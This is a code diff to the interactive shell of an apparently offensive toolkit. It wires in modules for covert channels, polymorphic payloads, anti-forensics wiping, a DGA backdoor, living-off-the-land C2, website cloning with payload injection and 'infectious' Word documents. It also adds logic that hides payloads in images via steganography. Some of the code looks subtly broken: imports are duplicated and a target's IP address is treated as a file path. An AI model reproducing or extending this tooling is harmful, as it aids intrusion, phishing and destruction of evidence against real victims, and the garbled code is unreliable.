@@ -20,13 +20,14 @@ from modules.covert_channel import send_arp_covert, listen_arp_covert
 from modules.polymorphic_engine import create_polymorphic_payload, generate_encryption_stub
 from modules.anti_forensics import scorched_earth
 from modules.target_manager import add_target, get_target, list_targets
-from modules.social_engineering import clone_website, create_macro_doc, send_email
+from modules.social_engineering import clone_website, create_macro_doc
+from modules.lotl_c2 import lotl_agent
+from modules.dga import generate_domains
+from modules.backdoor import dga_agent
+from modules.social_engineering import clone_website, create_macro_doc
 from modules.lotl_c2 import lotl_agent
 from modules.ape import unleash_ape
 from modules.hare import unleash_hare
-from modules.iot_scanner import scan_for_iot_devices
-from modules.port_forwarder import start_port_forwarder
-from modules.suggestor import get_suggestion, update_knowledge_base
 
 # --- Shell State ---
 current_target = None
@@ -49,9 +50,6 @@ def print_help():
     print("  lotl-agent        - Start the LOTL C2 agent")
     print("  ape-unleash       - Unleash the APE engine")
     print("  hare-unleash      - Unleash the HARE engine")
-    print("  scan-iot          - Scan for IoT devices")
-    print("  port-forward      - Forward a local port to a remote host")
-    print("  suggest           - Get a suggestion from the AI engine")
     print("  exit              - Exit the shell")
 
 def print_lure_help():
@@ -59,7 +57,6 @@ def print_lure_help():
     print("\n--- Social-Engineering Toolkit ---")
     print("  lure web <url> <payload_url>   - Clone a website and inject a payload")
     print("  lure doc <path> <payload_cmd>  - Create an infectious Word document")
-    print("  lure email                     - Start the email phishing wizard")
 
 def print_module_options():
     """Prints the options for the currently selected module."""
@@ -146,8 +143,24 @@ def main():
                     continue
 
                 if current_module == "stego/encode":
-                    # ... (existing run logic)
-                    pass
+                    payload = module_options.get("payload")
+                    output = module_options.get("output")
+                    rhost = module_options.get("rhost")
+
+                    if not all([payload, output, rhost]):
+                        print("Missing required options. Use 'options' to see what's needed.")
+                        continue
+
+                    target_info = get_target(rhost)
+                    if not target_info:
+                        print(f"Target '{rhost}' not found.")
+                        continue
+
+                    input_path = [ip for ip, data in list_targets().items() if data == target_info][0]
+
+                    print(f"Running stego/encode on {input_path}...")
+                    encode_image(input_path, payload, output)
+                    print("Module execution finished.")
             elif command == "lure":
                 if not args:
                     print_lure_help()
@@ -161,20 +174,6 @@ def main():
             elif command == "hare-unleash":
                 # ... (hare-unleash logic)
                 pass
-            elif command == "scan-iot":
-                if not args:
-                    print("Usage: scan-iot <subnet>")
-                else:
-                    scan_for_iot_devices(args[0])
-            elif command == "port-forward":
-                if len(args) != 4:
-                    print("Usage: port-forward <listen_host> <listen_port> <forward_host> <forward_port>")
-                else:
-                    threading.Thread(target=start_port_forwarder, args=(args[0], int(args[1]), args[2], int(args[3]))).start()
-            elif command == "suggest":
-                context = {"current_target": current_target["ip"] if current_target else None, "open_ports": current_target["open_ports"] if current_target else []}
-                suggestion = get_suggestion(context)
-                print(f"Suggestion: {suggestion}")
             else:
                 print(f"Unknown command: {command}")
 
